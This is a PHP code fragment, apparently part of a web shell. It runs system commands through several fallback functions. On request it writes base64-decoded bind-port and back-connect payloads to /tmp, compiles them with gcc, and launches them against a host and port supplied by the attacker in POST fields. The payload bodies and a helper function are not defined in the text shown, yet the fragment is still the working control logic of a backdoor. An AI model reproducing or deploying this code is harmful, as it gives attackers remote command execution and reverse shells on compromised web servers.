<?php 
function cf($f,$t) { 
    $w=@fopen($f,"w") or @function_exists('file_put_contents'); 
    if($w){ 
        @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t)); 
        @fclose($w); 
    } 
} 

function ex($in) { 
    $out = ''; 
    if(function_exists('exec')) { 
        @exec($in,$out); 
        $out = @join("\n",$out); 
    }elseif(function_exists('passthru')) { 
        ob_start(); 
        @passthru($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('system')) { 
        ob_start(); 
        @system($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('shell_exec')) { 
        $out = shell_exec($in); 
    }elseif(is_resource($f = @popen($in,"r"))) { 
        $out = ""; 
        while(!@feof($f)) 
            $out .= fread($f,1024); 
        pclose($f); 
    } 
    return $out; 
} 
		
if(isset($_POST['p1'])) {      
    if($_POST['p1'] == 'bpc') { 
        cf("/tmp/bp.c",$bind_port_c); 
        $out = ex("gcc -o /tmp/bp /tmp/bp.c"); 
        @unlink("/tmp/bp.c"); 
        $out .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &"); 
        echo "<pre class=ml1>$out\n".ex("ps aux | grep bp")."</pre>"; 
    } 
    if($_POST['p1'] == 'bpp') { 
        cf("/tmp/bp.pl",$bind_port_p); 
        $out = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &"); 
        echo "<pre class=ml1>$out\n".ex("ps aux | grep bp.pl")."</pre>"; 
    } 
    if($_POST['p1'] == 'bcc') { 
        cf("/tmp/bc.c",$back_connect_c); 
        $out = ex("gcc -o /tmp/bc /tmp/bc.c"); 
        @unlink("/tmp/bc.c"); 
        $out .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &"); 
        echo "<pre class=ml1>$out\n".ex("ps aux | grep bc")."</pre>"; 
    } 
    if($_POST['p1'] == 'bcp') { 
        cf("/tmp/bc.pl",$back_connect_p); 
        $out = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &"); 
        echo "<pre class=ml1>$out\n".ex("ps aux | grep bc.pl")."</pre>"; 
    } 
} 

?>